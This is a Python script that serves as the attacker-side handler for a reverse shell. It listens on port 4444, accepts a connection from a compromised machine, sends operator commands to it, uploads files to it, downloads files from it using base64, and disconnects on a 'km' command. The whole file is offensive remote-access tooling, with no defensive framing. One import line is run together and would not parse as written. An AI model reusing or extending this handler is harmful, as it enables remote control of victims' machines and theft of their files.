import socket
import json
import base64           from colorama import Fore, Style, init                                  # Initialize colorama
init(autoreset=True)    
# Server configuration
HOST = "0.0.0.0"  # Replace with your server's IP address
PORT = 4444  # Replace with your desired port

def send_json(conn, data):
    json_data = json.dumps(data)  # Convert TCP streams to JSON data for reliable transfer
    conn.send(json_data.encode())  # Encode to bytes before sending

def recieve_json(conn):
    json_data = ""
    while True:
        try:
            json_data = json_data + conn.recv(1024).decode()  # Decode bytes to string
            return json.loads(json_data)  # Return the full file till the end of the string/data
        except ValueError:
            continue

def write_file(path, content):
    with open(path, "wb") as file:  # Write binary file
        file.write(base64.b64decode(content))
        return "[+] Download successful [+]"

def read_file(path):
    with open(path, "rb") as file:  # Read binary file
        return base64.b64encode(file.read()).decode()  # Decode bytes to string

# Print starting message
print(Fore.GREEN + "Starting TCP Handler...")

# Set up the server
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
server.bind((HOST, PORT))
server.listen(5)

# Wait for a connection
print(Fore.YELLOW + f"Server listening on {Fore.CYAN}{HOST}:{PORT}")
client_socket, client_address = server.accept()
print(Fore.GREEN + f"Connection established with {client_address}")

try:
    while True:
        # Receive the prompt from the client
        prompt = client_socket.recv(1024).decode("utf-8")
        print(Fore.CYAN + prompt, end="")

        # Get user input
        command = input(">").split(" ")

        # Handle file upload/download locally
        if command[0] == "upload":
            file_content = read_file(command[1])
            command.append(file_content)

        # Send the command to the client
        send_json(client_socket, command)

        if command[0].lower() == "km":
            print(Fore.RED + "Disconnecting from client...")
            client_socket.close()
            break

        # Receive the output from the client
        response = recieve_json(client_socket)

        # Handle file download locally
        if command[0] == "download":
            response = write_file(command[1], response)

        print(Fore.WHITE + response)

except KeyboardInterrupt:
    print(Fore.RED + "\nShutting down the server.")
    client_socket.close()
    server.close()
